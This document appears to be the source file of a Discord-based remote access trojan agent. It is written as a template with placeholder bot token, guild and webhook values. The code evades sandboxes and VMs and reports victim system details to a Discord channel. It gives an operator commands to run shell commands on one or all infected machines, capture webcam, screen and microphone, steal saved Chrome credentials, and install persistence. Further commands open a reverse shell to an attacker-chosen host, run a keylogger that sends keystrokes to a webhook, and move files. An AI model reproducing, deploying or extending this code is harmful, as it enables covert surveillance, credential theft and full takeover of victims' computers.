
import os
import sys
import threading

import discord
from discord.ext import commands
from discord import app_commands

from datetime import datetime

from libraries import sandboxevasion, keylogger, credentials, maciassdopia


GUILD = discord.Object(id = "{GUILD}")
CHANNEL = int("{CHANNEL}")
KEYLOG_WEBHOOK = "{KEYLOG_WEBHOOK}"
CURRENT_AGENT = 0

class BOT(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix = "!", intents = intents, help_command=None)

    async def on_ready(self):
        await self.wait_until_ready()

        self.channel = self.get_channel(CHANNEL)
        now = datetime.now()

        my_embed = discord.Embed(title = f"{MSG}", description = f"**Time: {now.strftime('%d/%m/%y %H:%M:%S')}**", color = COLOR)
        my_embed.add_field(name = "**IP**", value = maciassdopia.getIP(), inline = True)
        my_embed.add_field(name = "**Bits**", value = maciassdopia.getBits(), inline = True)
        my_embed.add_field(name = "**HostName**", value = maciassdopia.getHostname(), inline = True)
        my_embed.add_field(name = "**OS**", value = maciassdopia.getOS(), inline = True)
        my_embed.add_field(name = "**Username**", value = maciassdopia.getUsername(), inline = True)
        my_embed.add_field(name = "**CPU**", value = maciassdopia.getCPU(), inline = False)
        my_embed.add_field(name = "**Is Admin**", value = maciassdopia.isAdmin(), inline = True)
        my_embed.add_field(name = "**Is VM**", value = maciassdopia.isVM(), inline = True)
        my_embed.add_field(name = "**Auto Keylogger**", value = False, inline = True)

        await self.channel.send(embed = my_embed)
    
    async def setup_hook(self):
        await self.tree.sync(guild = GUILD)
        
    async def on_command_error(self, ctx, error):
        my_embed = discord.Embed(title = f"**Error:** {error}", color=0xFF0000)
        await ctx.reply(embed = my_embed)


class InteractButton(discord.ui.View):
    def __init__(self, inv:str, id:int):
        super().__init__()
        self.inv = inv
        self.id = id


    @discord.ui.button(label = "Interact", style = discord.ButtonStyle.blurple, emoji = "🔗")
    async def interactButton(self, interaction:discord.Interaction, button:discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = self.id

        my_embed = discord.Embed(
            title = f"Interacted with agent {self.id}",
            color = 0x00FF00
        )
        
        await interaction.response.send_message(
            embed = my_embed,
            ephemeral=True
        )


    @discord.ui.button(label = "Terminate", style = discord.ButtonStyle.gray, emoji = "❌")
    async def terminateButton(self, interaction:discord.Interaction, button:discord.ui.Button):
        my_embed = discord.Embed(
            title = f"Terminating Connection With Agent#{self.id}",
            color=0x00FF00
        )
        await interaction.response.send_message(embed = my_embed)
        await bot.close()
        sys.exit()


    @discord.ui.button(label = "Webshot", style = discord.ButtonStyle.gray, emoji = "📸")
    async def webshot(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.webshot()
        if result != False:
            await interaction.response.send_message(file = discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(
                title = f"Error while taking photo of Agent#{self.id}",
                color=0xFF0000
            )
            await interaction.response.send_message(embed = my_embed)


    @discord.ui.button(label = "Process", style = discord.ButtonStyle.gray, emoji = "📊")
    async def process(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.process()
        if len(result) > 4000:
            path = os.environ["temp"] + "\\response.txt"
            with open(path, 'w') as file:
                file.write(result)
            await interaction.response.send_message(file = discord.File(path))
            os.remove(path)
        else:
            await interaction.response.send_message(f"```\n{result}\n```")


    @discord.ui.button(label = "Screenshot", style = discord.ButtonStyle.gray, emoji = "🖼️")
    async def screenshot(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.screenshot()
        if result != False:
            await interaction.response.send_message(file = discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(
                title = f"Error while taking screenshot of Agent#{self.id}",
                color = 0xFF0000
            )
            await interaction.response.send_message(embed = my_embed)


    @discord.ui.button(label = "Creds", style = discord.ButtonStyle.gray, emoji = "🔑")
    async def creds(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.creds()
        if result != False:
            await interaction.response.send_message(file = discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(
                title = f"Error while grabbing credentials from Agent#{self.id}",
                color = 0xFF0000
            )
            await interaction.response.send_message(embed = my_embed)


    @discord.ui.button(label = "Persistent", style = discord.ButtonStyle.gray, emoji = "🔁")
    async def persistent(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.persistent()
        if result:
            my_embed = discord.Embed(
                title = f"Persistance enabled on Agent#{self.id}",
                color = 0x00FF00
            )
        else:
            my_embed = discord.Embed(
                title = f"Error while eanbling persistance on Agent#{self.id}",
                color = 0xFF0000
            )
        await interaction.response.send_message(embed = my_embed)


    @discord.ui.button(label = "Location", style = discord.ButtonStyle.gray, emoji = "🌐")
    async def location(self, interaction:discord.Interaction, button:discord.ui.Button):
        response = maciassdopia.location()
        if response != False:
            my_embed = discord.Embed(
                title = f"IP Based Location on Agent#{self.id}",
                color = 0x00FF00
            )
            my_embed.add_field(name="IP:", value=f"**{response['ip']}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{response['hostname']}**", inline=False)
            my_embed.add_field(name="City:", value=f"**{response['city']}**", inline=False)
            my_embed.add_field(name="Region:", value=f"**{response['region']}**", inline=False)
            my_embed.add_field(name="Country:", value=f"**{response['country']}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{response['org']}**", inline=False)
        else:
            my_embed = discord.Embed(
                title = f"Error while getting location of Agent{self.id}",
                color = 0xFF0000
            )
        await interaction.response.send_message(embed = my_embed)


    @discord.ui.button(label = "Selfdestruct", style = discord.ButtonStyle.red, emoji = "💣")
    async def selfdestruct(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.selfdestruct()
        if result:
            my_embed = discord.Embed(
                title = f"Agent#{self.id} has been deleted",
                color = 0x00FF00
            )
        else:
            my_embed = discord.Embed(
                title = f"Error while deleting Agent#{self.id}: {result}",
                color = 0xFF0000
            )
        await interaction.response.send_message(embed = my_embed)
            

bot = BOT()


@bot.hybrid_command(name = "interact", with_app_command = True)
@app_commands.guilds(GUILD)
async def cmd(ctx:commands.Context, id:int):
    global CURRENT_AGENT
    CURRENT_AGENT = id
    my_embed = discord.Embed(
        title = f"Interacting with Agent#{id}",
        color = 0x00FF00
    )
    await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "background", with_app_command = True)
@app_commands.guilds(GUILD)
async def cmd(ctx:commands.Context):
    global CURRENT_AGENT
    CURRENT_AGENT = 0
    my_embed = discord.Embed(
        title = f"Background Agent",
        color = 0x00FF00
    )
    await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "cmd", with_app_command = True)
@app_commands.guilds(GUILD)
async def cmd(ctx:commands.Context, command:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.cmd(command)
        if len(result) > 2000:
            path = os.environ["temp"] + "\\response.txt"
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file = discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"```{result}```")


@bot.hybrid_command(name = "cmd-all", with_app_command = True)
@app_commands.guilds(GUILD)
async def cmd(ctx:commands.Context, command:str):
    result = maciassdopia.cmd(command)
    if len(result) > 2000:
        path = os.environ["temp"] + "\\response.txt"
        with open(path, 'w') as file:
            file.write(result)
        await ctx.reply(file = discord.File(path))
        os.remove(path)
    else:
        await ctx.reply(f"```{result}```")


@bot.hybrid_command(name = "webshot", with_app_command = True)
@app_commands.guilds(GUILD)
async def webshot(ctx:commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(
                title = f"Please use **!webshot {ID}** instead of the slash command",
                color = 0xFF0000
            )
            await ctx.reply(embed = my_embed)
        else:
            result = maciassdopia.webshot()
            if result != False:
                await ctx.reply(file = discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(
                    title = f"Error while taking photo to Agent#{ID}",
                    color = 0xFF0000
                )
                await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "cd", with_app_command = True)
@app_commands.guilds(GUILD)
async def cd(ctx:commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.cd(path)
        if (result):
            my_embed = discord.Embed(
                title = f"Succesfully changed directory to: {path}",
                color = 0x00FF00
            )
        else:
            my_embed = discord.Embed(
                title = f"Error while changing directory:\n{result}",
                color = 0xFF0000
            )
        await ctx.reply(embed = my_embed)



@bot.hybrid_command(name = "process", with_app_command = True)
@app_commands.guilds(GUILD)
async def upload(ctx:commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.process()
        if len(result) > 2000:
            path = os.environ["temp"] + "\\response.txt"
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file = discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"```{result}```")


@bot.hybrid_command(name = "upload", with_app_command = True)
@app_commands.guilds(GUILD)
async def upload(ctx:commands.Context, url:str, name:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.upload(url, name)
        if result:
            my_embed = discord.Embed(
                title = f"{name} has been uploaded to Agent#{ID}",
                color = 0x00FF00
            )
        else:
            my_embed = discord.Embed(
                title = f"Error while uploading {name} to Agent#{ID}:\n{result}",
                color = 0xFF0000
            )
        await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "screenshot", with_app_command = True)
@app_commands.guilds(GUILD)
async def screenshot(ctx:commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.screenshot()
        if result != False:
            await ctx.reply(file = discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(
                title = f"Error while taking screenshot of Agent#{ID}",
                color = 0xFF0000
            )
            await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "creds", with_app_command = True)
@app_commands.guilds(GUILD)
async def creds(ctx:commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.creds()
        if result != False:
            await ctx.reply(file = discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(
                title = f"Error while grabbing credentials from Agent#{ID}",
                color = 0xFF0000
            )
            await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "persistent", with_app_command = True)
@app_commands.guilds(GUILD)
async def persistent(ctx:commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.persistent()
        if result:
            my_embed = discord.Embed(
                title = f"Persistance enableed on Agent#{ID}",
                color = 0x00FF00
            )
        else:
            my_embed = discord.Embed(
                title = f"Error while enabling persistance on Agent#{ID}",
                color = 0xFF0000
            )
        await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "ls", with_app_command = True)
@app_commands.guilds(GUILD)
async def ls(ctx: commands.Context):
    if ctx.interaction:
        my_embed = discord.Embed(
            title = f"Please use **!ls {ID}** instead of the slash command",
            color = 0xFF0000
        )
        await ctx.reply(embed = my_embed)
    else:
        my_embed = discord.Embed(
            title = f"Agent #{ID}   IP: {maciassdopia.getIP()}",
            color = 0xADD8E6
        )
        my_embed.add_field(
            name = "**OS**",
            value = maciassdopia.getOS(),
            inline = False
        )
        my_embed.add_field(
            name = "**Username**",
            value = maciassdopia.getUsername(),
            inline = True
        )
        view = InteractButton("Interact", ID)
        await ctx.reply(embed = my_embed, view = view)


@bot.hybrid_command(name = "download", with_app_command = True)
@app_commands.guilds(GUILD)
async def download(ctx:commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            await ctx.reply(f"**Agent #{ID}** Requested File", file = discord.File(path))
        except Exception as e:
            my_embed = discord.Embed(
                title=f"Error while downloading from Agent#{ID}:\n{e}",
                color=0xFF0000
            )
            await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "terminate", with_app_command = True)
@app_commands.guilds(GUILD)
async def download(ctx:commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        my_embed = discord.Embed(
            title=f"Terminating connection with Agent#{ID}",
            color=0x00FF00
        )
        await ctx.reply(embed = my_embed)
        await bot.close()
        sys.exit()


@bot.hybrid_command(name = "selfdestruct", with_app_command = True)
@app_commands.guilds(GUILD)
async def selfdestruct(ctx:commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.selfdestruct()
        if result:
            my_embed = discord.Embed(
                title=f"Agent#{ID} has been deleted",
                color=0x00FF00
            )
        else:
            my_embed = discord.Embed(
                title=f"Error while deleting Agent#{ID}: {result}",
                color=0xFF0000
            )
        await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "location", with_app_command = True)
@app_commands.guilds(GUILD)
async def location(ctx:commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        response = maciassdopia.location()
        if response != False:
            my_embed = discord.Embed(
                title = f"IP Based Location on Agent#{ID}",
                color = 0x00FF00
            )
            my_embed.add_field(name="IP:", value=f"**{response['ip']}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{response['hostname']}**", inline=False)
            my_embed.add_field(name="City:", value=f"**{response['city']}**", inline=False)
            my_embed.add_field(name="Region:", value=f"**{response['region']}**", inline=False)
            my_embed.add_field(name="Country:", value=f"**{response['country']}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{response['org']}**", inline=False)
        else:
            my_embed = discord.Embed(
                title=f"Error while getting location of Agent#{ID}",
                color=0xFF0000
            )
        await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "revshell", with_app_command = True)
@app_commands.guilds(GUILD)
async def location(ctx:commands.Context, ip:str, port:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.revshell(ip, port)
        if result:
            my_embed = discord.Embed(
                title = f"Attempting to Estabilish Reverse Shell on Agent#{ID}",
                color = 0x00FF00
            )
        await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "recordmic", with_app_command = True)
@app_commands.guilds(GUILD)
async def recordmic(ctx:commands.Context, seconds:int):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(
                title = f"Please use **!recordmic {ID}** instead of the slash command",
                color = 0xFF0000
            )
            await ctx.reply(embed = my_embed)
        else:
            result = maciassdopia.recordmic(seconds)
            if result != False:
                await ctx.reply(file = discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(
                    title=f"Error while starting recording on Agent#{ID}",
                    color=0xFF0000
                )
                await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "wallpaper", with_app_command = True)
@app_commands.guilds(GUILD)
async def wallpaper(ctx:commands.Context, path_url:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.wallpaper(path_url)
        if result:
            my_embed = discord.Embed(
                title=f"Wallpaper changed on Agent#{ID}",
                color=0x00FF00
            )
        else:
            my_embed = discord.Embed(
                title=f"Error while changing wallpaper on Agent#{ID}",
                color=0xFF0000
            )
        await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "killproc", with_app_command = True)
@app_commands.guilds(GUILD)
async def killproc(ctx:commands.Context, pid:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = maciassdopia.killproc(pid)
        if result:
            my_embed = discord.Embed(
                title=f"Process {pid} killed on Agent#{ID}",
                color=0x00FF00
            )
        else:
            my_embed = discord.Embed(
                title=f"Error while killing process {pid} on Agent#{ID}",
                color=0xFF0000
            )
        await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "keylog", with_app_command = True)
@app_commands.guilds(GUILD)
async def keylog(ctx:commands.Context, mode:str, interval:int):
    if (int(CURRENT_AGENT) == int(ID)):
        logger = keylogger.Keylogger(
            interval = interval,
            ID = ID,
            webhook = KEYLOG_WEBHOOK,
            report_method = "webhook"
        )
        if mode == "stop":
            logger.stop()
            my_embed = discord.Embed(
                title = f"Keylogger stopped on Agent#{ID}",
                color = 0x00FF00
            )
        else:
            threading.Thread(target = logger.start()).start()
            my_embed = discord.Embed(
                title = f"Keylogger started on Agent#{ID}",
                color = 0x00FF00
            )
        await ctx.reply(embed = my_embed)


@bot.hybrid_command(name = "help", with_app_command = True)
@app_commands.guilds(GUILD)
async def keylog(ctx:commands.Context):
    my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
    my_embed.add_field(name="/help", value="Shows this menu", inline=False)
    my_embed.add_field(name="/interact <id>", value="Interact with a specific agent", inline=False)
    my_embed.add_field(name="/background", value="Background your current agent", inline=False)
    my_embed.add_field(name="/cmd <command>", value="Run command on target", inline=False)
    my_embed.add_field(name="/cd <path>", value="Change current directory", inline=False)
    my_embed.add_field(name="/webshot ", value="Grab a picture from the webcam", inline=False)
    my_embed.add_field(name="/process ", value="Get a list of all running processes", inline=False)
    my_embed.add_field(name="/upload <url>", value="Upload file to agent", inline=False)
    my_embed.add_field(name="/screenshot ", value="Grab a screenshot from the agent", inline=False)
    my_embed.add_field(name="/creds ", value="Get chrome saved credentials", inline=False)
    my_embed.add_field(name="/persistent ", value="Enable persistence", inline=False)
    my_embed.add_field(name="!ls", value="Get a list of all active agents", inline=False)
    my_embed.add_field(name="/download <path>", value="Download file from agent", inline=False)
    my_embed.add_field(name="/terminate ", value="Terminate the session ", inline=False)
    my_embed.add_field(name="/cmd-all <command>", value="Run a command on all agents", inline=False)
    my_embed.add_field(name="/location ", value="Get the location of the target machine", inline=False)
    my_embed.add_field(name="/revshell <ip> <port>", value="Get a reverse shell on the target machine", inline=False)
    my_embed.add_field(name="/recordmic <interval>", value="Record the microphone of the target machine", inline=False)
    my_embed.add_field(name="/wallpaper <path/url>", value="Change the wallpaper of the target machine", inline=False)
    my_embed.add_field(name="/killproc <pid>", value="Kill a process on the target machine", inline=False)
    my_embed.add_field(name="/keylog <mode> <interval>", value="Start/Stop a keylogger on the target machine\n/`keylog start 60`", inline=False)
    await ctx.reply(embed = my_embed)


if sandboxevasion.test() == True and maciassdopia.isVM() == False:
    config = maciassdopia.createConfig()
    ID = maciassdopia.id()
    # maciassdopia.persistent()
    if config:
        MSG = f"New Agent Online #{ID}"
        COLOR = 0x00ff00
    else:
        MSG =f"Agent Online #{ID}"
        COLOR = 0x0000FF

    bot.run("{TOKEN}")